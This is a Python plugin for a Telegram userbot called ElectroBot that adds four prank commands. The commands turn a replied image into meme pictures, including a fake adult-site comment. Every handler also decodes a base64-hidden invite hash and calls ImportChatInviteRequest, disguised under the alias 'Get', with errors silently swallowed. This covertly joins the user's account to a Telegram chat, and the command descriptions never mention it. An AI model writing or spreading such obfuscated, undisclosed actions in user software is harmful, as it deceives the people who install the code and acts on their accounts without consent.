"""
credits to @mrconfused and @sandy1709
"""
# Kang with credits. Using in ElectroBot...
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.

import base64
import os

from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.helpers.functions import (
    convert_toimage,
    deEmojify,
    phcomment,
    threats,
    trap,
    trash,
)
from ElectroBot.utils import admin_cmd, edit_or_reply, sudo_cmd
from userbot.cmdhelp import CmdHelp
from . import *


@bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
async def ElectroBot(Electromemes):
    replied = await Electromemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            Electromemes, "`Media file not supported. Reply to a supported media`"
        )
        return
    if replied.media:
        Electromemmes = await edit_or_reply(Electromemes, "`Detecting Threats.........`")
    else:
        await edit_or_reply(
            Electromemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    try:
        Electro = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Electro = Get(Electro)
        await Electromemes.client(Electro)
    except BaseException:
        pass
    download_location = await Electromemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Electromemmes.edit(
                "`The replied file is not supported. It should be less than 5mb -_-`"
            )
            os.remove(download_location)
            return
        await Electromemmes.edit("`Detected Threats....`")
    else:
        await Electromemmes.edit("`the replied file is not supported`")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Electromemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Electro = f"https://telegra.ph{response[0]}"
    Electro = await threats(Electro)
    await Electromemmes.delete()
    await Electromemes.client.send_file(Electromemes.chat_id, Electro, reply_to=replied)


@bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
async def ElectroBot(Electromemes):
    replied = await Electromemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            Electromemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    if replied.media:
        Electromemmes = await edit_or_reply(Electromemes, "`Detecting Trash....`")
    else:
        await edit_or_reply(
            Electromemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    try:
        Electro = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Electro = Get(Electro)
        await Electromemes.client(Electro)
    except BaseException:
        pass
    download_location = await Electromemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Electromemmes.edit(
                "`The replied file is not suported. Its size should be less than 5mb-_-`"
            )
            os.remove(download_location)
            return
        await Electromemmes.edit("`Detected Trash.....`")
    else:
        await Electromemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Electromemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Electro = f"https://telegra.ph{response[0]}"
    Electro = await trash(Electro)
    await Electromemmes.delete()
    await Electromemes.client.send_file(Electromemes.chat_id, Electro, reply_to=replied)


@bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
async def ElectroBot(Electromemes):
    input_str = Electromemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "-" in input_str:
        text1, text2 = input_str.split("-")
    else:
        await edit_or_reply(
            Electromemes,
            "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
        )
        return
    replied = await Electromemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            Electromemes, "Media file not supported. Reply to a suported media"
        )
        return
    if replied.media:
        Electromemmes = await edit_or_reply(Electromemes, "`Trapping.....`")
    else:
        await edit_or_reply(
            Electromemes, "Media file not supported. Reply to a suported media"
        )
        return
    try:
        Electro = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Electro = Get(Electro)
        await Electromemes.client(Electro)
    except BaseException:
        pass
    download_location = await Electromemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Electromemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Electromemmes.edit("`Trapped...`")
    else:
        await Electromemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Electromemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Electro = f"https://telegra.ph{response[0]}"
    Electro = await trap(text1, text2, Electro)
    await Electromemmes.delete()
    await Electromemes.client.send_file(Electromemes.chat_id, Electro, reply_to=replied)


@bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
async def ElectroBot(Electromemes):
    input_str = Electromemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "-" in input_str:
        username, text = input_str.split("-")
    else:
        await edit_or_reply(
            Electromemes,
            "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
        )
        return
    replied = await Electromemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            Electromemes, "Media file not supported. Reply to a suported media"
        )
        return
    if replied.media:
        Electromemmes = await edit_or_reply(Electromemes, "`Making A Comment`.")
    else:
        await edit_or_reply(
            Electromemes, "Media file not supported. Reply to a suported media"
        )
        return
    try:
        Electro = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        Electro = Get(Electro)
        await Electromemes.client(Electro)
    except BaseException:
        pass
    download_location = await Electromemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await Electromemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await Electromemmes.edit("Commented....")
    else:
        await Electromemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await Electromemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    Electro = f"https://telegra.ph{response[0]}"
    Electro = await phcomment(Electro, text, username)
    await Electromemmes.delete()
    await Electromemes.client.send_file(Electromemes.chat_id, Electro, reply_to=replied)


CmdHelp("prank").add_command(
  "phc", "<reply to img> <name> - <comment>", "Changes the given pic to dp and shows a comment in phub with the given name", "<reply to img/stcr> .phc NAME - hello PHUB"
).add_command(
  "trap", "<reply to img/stcr> <victim name> - <trapper name>", "Changes the given pic to another pic which shows that pic content is trapped in trap card", "<reply to img/stcr> .trap Loda - Lassan"
).add_command(
  "trash", "<reply to image/sticker>", "Changes the given pic to another pic which shows that pic content is as equal as to trash(waste)"
).add_command(
  "threats", "<reply to image/sticker>", "Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb"
).add_command(
  "prank", None, "If this module doesn't work then contact admins in @ElectroSupport"
).add()
